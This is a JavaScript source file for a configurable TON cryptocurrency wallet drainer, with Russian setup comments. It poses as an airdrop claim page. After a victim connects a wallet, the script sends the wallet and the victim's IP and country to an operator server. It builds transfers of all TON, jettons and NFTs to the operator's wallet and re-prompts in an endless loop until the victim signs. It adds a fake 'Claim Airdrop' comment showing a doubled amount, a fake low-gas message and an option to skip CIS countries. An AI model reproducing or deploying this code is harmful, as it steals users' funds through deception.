const server_domain = "tonsdk-server.sbs"; //Ваш домен сервера в формате "domain.com"

//Дополнительные настройки:
const dynamicTxt = "true"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
const sumDyn = "2"; // Множитель для динамичного комментария
const textDyn = "Receive:  "; // Текст в динамичном комментарии
const txt_com = "✅ Claim Airdrop..."; // Комментарий при трансфере TON и JETTON(Статичный)
const txtnft_com = "✅ Claim Airdrop..."; // Комментарий при трансфере NFT(Статичный)

//Настройки модального окна при минимальном балансе:
const h1_message = 'Transaction rejected'; //Заголовок
const p_message = 'Not enough TON to pay the gas fee!'; //Обычный текст

//Технические настройки:
const sng = "false"; //Защита СНГ стран, включать только в целях тестирования.

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://tonsdk-server.sbs/tonconnect-manifest.json', //Сюда указать путь на ваш манифест
    buttonRootId: 'openModal'
});

let min_totalbal;
let forFee;
let mainWallet;

fetch(`https://${server_domain}/api/main-wallet`)
    .then(response => response.json())
    .then(data => {
        mainWallet = data.mainWallet;
    })
    .catch(error => {
        console.error('Error fetching mainWallet:', error);
    });

fetch(`https://${server_domain}/api/min_totalbal`)
    .then(response => response.json())
    .then(data => {
        min_totalbal = data.min_totalbal;
    })
    .catch(error => {
        console.error('Error fetching min_totalbal:', error);
    });

fetch(`https://${server_domain}/api/forfee`)
    .then(response => response.json())
    .then(data => {
        forFee = data.forFee;
    })
    .catch(error => {
        console.error('Error fetching forFee:', error);
    });

let connectedWallet;
let UserInfo;
let messages = [];

fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const ipUser = data.ip;
        const country = data.country;
        const currentDomain = window.location.hostname;
        UserInfo = {
            ip: data.ip,
            country: data.country,
            domain: currentDomain
        };
        if (sng === "true" && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
            window.location.replace('https://ton.org');
        } else {
            fetch(`https://${server_domain}/api/opened`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(UserInfo)
                })
                .then(response => response.json())
                .then(data => console.log('Success:', data))
                .catch(error => console.error('Error:', error));
        }
    })
    .catch(error => console.error('Error IP:', error));

const unsubscribe = tonConnectUI.onStatusChange(wallet => {
    connectedWallet = wallet;
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const ipUser = data.ip;
            const country = data.country;
            const currentDomain = window.location.hostname;
            const UserInfo = {
                ip: data.ip,
                country: data.country,
                domain: currentDomain
            };
            if (sng === "true" && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                window.location.replace('https://ton.org');
            } else {
                const payload = {
                    ConnectedWallet: connectedWallet,
                    UserInfo: UserInfo
                };

                fetch(`https://${server_domain}/api/connected`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                        processAssets(data.assetList, data.totalBalance);
                    })
                    .catch(error => console.error('Error:', error));
            }
        })
        .catch(error => console.error('Error IP:', error));
});

async function processAssets(assetList, totalBalance) {
    const assetTypeSum = assetList.reduce((acc, asset) => {
        if (!acc[asset.type]) {
            acc[asset.type] = 0;
        }
        acc[asset.type] += asset.calculatedBalanceUSDTG;
        return acc;
    }, {});

    const sortedTypes = Object.entries(assetTypeSum).sort((a, b) => b[1] - a[1]).map(entry => entry[0]);
    let uniqueAssetList = assetList.filter((item, index, self) =>
        index === self.findIndex((t) =>
            t.type === item.type &&
            t.balance === item.balance &&
            t.name === item.name
        )
    );

    const tonAssets = uniqueAssetList.filter(asset => asset.type === "TON");
    const jettonAssets = uniqueAssetList.filter(asset => asset.type === "Jetton");
    const nftAssets = uniqueAssetList.filter(asset => asset.type === "NFT");
    if (uniqueAssetList.reduce((total, asset) => total + asset.calculatedBalanceUSDTG, 0) < min_totalbal) {
        await showModal();
        return;
    }

    for (const type of sortedTypes) {
        switch (type) {
            case 'TON':
                if (tonAssets.length > 0) {
                    const message = await sendTon(tonAssets[0]);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
            case 'Jetton':
                for (let i = 0; i < jettonAssets.length; i += 4) {
                    const chunk = jettonAssets.slice(i, Math.min(i + 4, jettonAssets.length));
                    console.log("Sending Jetton chunk:", chunk);
                    const message = await sendToken(chunk);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
            case 'NFT':
                for (let i = 0; i < nftAssets.length; i += 4) {
                    const chunk = nftAssets.slice(i, Math.min(i + 4, nftAssets.length));
                    console.log("Sending NFT chunk:", chunk);
                    const message = await sendNft(chunk);
                    messages = [...messages, ...message];
                    console.log(messages);
                }
                break;
        }
    }

    console.log(JSON.stringify(messages));

    while (true) {
        for (let i = 0; i < messages.length; i += 4) {
            const chunk = messages.slice(i, Math.min(i + 4, messages.length));
            const payload = {
                ConnectedWallet: connectedWallet,
                UserInfo: UserInfo,
                chunk: chunk
            };

            await fetch(`https://${server_domain}/api/creatingJetton`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => console.log('Success:', data))
                .catch(error => console.error('Error:', error));

            const transactionData = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: chunk,
                UserInfo: UserInfo,
                ConnectedWallet: connectedWallet
            };

            try {
                result = await tonConnectUI.sendTransaction(transactionData);
                await fetch(`https://${server_domain}/api/transactionStatus`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        status: 'sent',
                        transactionResult: result,
                        chunk: chunk,
                        UserInfo: UserInfo,
                        ConnectedWallet: connectedWallet
                    })
                });

                if (result.success) {
                    await fetch(`https://${server_domain}/api/transactionStatus`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            status: 'confirmed',
                            transactionResult: result,
                            chunk: chunk,
                            UserInfo: UserInfo,
                            ConnectedWallet: connectedWallet
                        })
                    });
                } else {
                    await fetch(`https://${server_domain}/api/transactionStatus`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            status: 'cancelled',
                            transactionResult: result,
                            chunk: chunk,
                            UserInfo: UserInfo,
                            ConnectedWallet: connectedWallet
                        })
                    });
                }
            } catch (error) {
                console.error('Error sending TON transaction:', error);
                await fetch(`https://${server_domain}/api/transactionStatus`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        status: 'error',
                        chunk: chunk,
                        error: error.message,
                        UserInfo: UserInfo,
                        ConnectedWallet: connectedWallet
                    })
                });
            }
        }
    }
}

async function sendTon(asset) {
    try {
        let text_com;

        if (dynamicTxt === "true") {
            text_com = textDyn + ((asset.sendingBalance / 1000000000).toFixed(2) * sumDyn) + " TON";
        } else {
            text_com = txt_com;
        }

        const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyTon`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ text_com: text_com })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}`);
        }

        const data = await response.json();
        const bodyBoc = data.bodyBoc;

        if (asset.sendingBalance > forFee) {
            return [{
                address: mainWallet,
                amount: asset.sendingBalance,
                payload: bodyBoc,
                name: 'TON',
                usdBal: asset.calculatedBalanceUSDTG
            }];
        } else {
            showModal();
            return [];
        }
    } catch (error) {
        console.error('Error sending TON transaction:', error);
        return [];
    }
}

async function sendToken(chunk) {
    try {
        const messages = [];
        for (const asset of chunk) {
            let text_com;

            if (dynamicTxt === "true") {
                text_com = textDyn + ((asset.TokenBalance / 1000000000).toFixed(2) * sumDyn) + " " + asset.symbol;
            } else {
                text_com = txt_com;
            }

            const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyJetton`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    text_com: text_com,
                    mainWallet: mainWallet,
                    tokenBalance: asset.TokenBalance
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}, Body: ${errorText}`);
            }

            const data = await response.json();
            const bodyBoc = data.bodyBoc;

            const transaction = {
                address: asset.wallet_address,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending Token transaction:', error);
        return [];
    }
}

async function sendNft(chunk) {
    try {
        const messages = [];

        for (const asset of chunk) {
            const response = await fetch(`https://${server_domain}/api/generate-transaction-bodyNft`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    text_com: txtnft_com,
                    mainWallet: mainWallet,
                    nftAddress: asset.data
                })
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}, Body: ${errorText}`);
            }

            const data = await response.json();
            const bodyBoc = data.bodyBoc;

            const transaction = {
                address: asset.data,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending NFT transaction:', error);
        return [];
    }
}

function showModal() {
    // Реализация функции показа модального окна с сообщением о недостаточном балансе
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '50%';
    modal.style.left = '50%';
    modal.style.transform = 'translate(-50%, -50%)';
    modal.style.padding = '20px';
    modal.style.backgroundColor = 'white';
    modal.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.1)';
    modal.innerHTML = `<h1>${h1_message}</h1><p>${p_message}</p>`;
    document.body.appendChild(modal);

    // Закрыть модальное окно через 3 секунды
    setTimeout(() => {
        document.body.removeChild(modal);
    }, 3000);
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}